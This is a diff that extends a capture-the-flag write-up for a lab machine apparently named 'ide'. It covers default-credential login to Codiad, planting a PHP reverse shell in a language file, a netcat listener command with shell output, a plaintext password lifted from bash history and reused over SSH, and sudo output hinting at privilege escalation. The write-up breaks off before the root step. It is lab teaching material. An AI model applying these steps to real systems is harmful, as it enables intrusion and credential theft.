@@ -138,3 +138,60 @@ After few research the default password is ... password.
 
 Let's try to connect via the form on the index page with this credentials : john/password. That works !
 
+It is possible to add a project. If we add a projet with a random name like "Test" and this path : /var/www/html/codiad we will see and we can modify some files presents on the site. Let's try to modify a file with a reverse shell. For example, we can use /languages/bg.php and replace the content with a php reverse shell. Dont't forget to replace your IP address and save. Now, we need to set a netcat listenner with this command :
+
+```bash
+$ nc -lnvp <listenning_port>
+```
+
+Now, we need to call this page /languages/bg.php.
+
+Nice ! We get a shell on our netcat listenner.
+
+```bash
+Listening on [0.0.0.0] (family 0, port 1234)
+Connection from 10.10.124.121 55972 received!
+Linux ide 4.15.0-147-generic #151-Ubuntu SMP Fri Jun 18 19:21:19 UTC 2021 x86_64 x86_64 x86_64 GNU/Linux
+ 20:42:00 up 53 min,  0 users,  load average: 0.00, 0.00, 0.00
+USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
+uid=33(www-data) gid=33(www-data) groups=33(www-data)
+/bin/sh: 0: can't access tty; job control turned off
+```
+
+If we check the user drac history, we can see this following entry :
+
+```bash
+/home/drac
+$ cat .bash_history
+mysql -u drac -p 'Th3dRaCULa1sR3aL'
+```
+
+We can try to connect on the ssh to the target machine with this password.
+
+```bash
+Last login: Wed Aug  4 06:36:42 2021 from 192.168.0.105
+drac@ide:~$ 
+```
+
+That works. We are connected as drac user.
+
+---
+
+## User flag
+
+Now, we can get the user's flag at /home/drac/user.txt
+
+---
+
+Now, we need to privesc to the user root. 
+
+If we check the sudo's commands of the drac user we can see this :
+
+```bash
+drac@ide:/$ sudo -l
+Matching Defaults entries for drac on ide:
+    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
+
+User drac may run the following commands on ide:
+    (ALL : ALL) /usr/sbin/service vsftpd restart
+```
